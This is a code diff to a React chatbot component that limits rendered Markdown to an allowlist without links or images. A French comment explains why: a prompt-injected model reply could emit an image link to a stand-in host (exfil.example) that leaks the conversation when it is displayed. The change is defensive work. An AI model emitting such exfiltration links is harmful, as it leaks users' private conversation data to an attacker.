@@ -4,6 +4,19 @@ import { Send, MessageCircle, Loader2 } from "lucide-react";
 import { askChatbot } from "../utils/chatbotApi";
 import ReactMarkdown from 'react-markdown';
 
+/**
+ * Le rendu Markdown échappe déjà le HTML brut (pas de rehype-raw), mais il
+ * affiche liens et images. Une réponse manipulée par injection de prompt
+ * pourrait émettre ![](https://exfil.example/?d=...) et faire fuiter le contenu
+ * de la conversation au simple affichage. On neutralise donc les URLs distantes.
+ */
+const allowedElements = [
+  'p', 'br', 'strong', 'em', 'del', 'code', 'pre',
+  'ul', 'ol', 'li', 'blockquote',
+  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+  'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr',
+];
+
 interface Message {
   id: number;
   sender: "user" | "bot";
@@ -95,7 +108,10 @@ const Chatbot: React.FC = () => {
                   }`}
                 >
                   <div className={`text-sm ${msg.sender === "user" ? "text-white" : "text-gray-800"}`}>
-                    <ReactMarkdown>{msg.text}</ReactMarkdown>
+                    <ReactMarkdown
+                      allowedElements={allowedElements}
+                      unwrapDisallowed
+                    >{msg.text}</ReactMarkdown>
                   </div>
                 </div>
               </div>
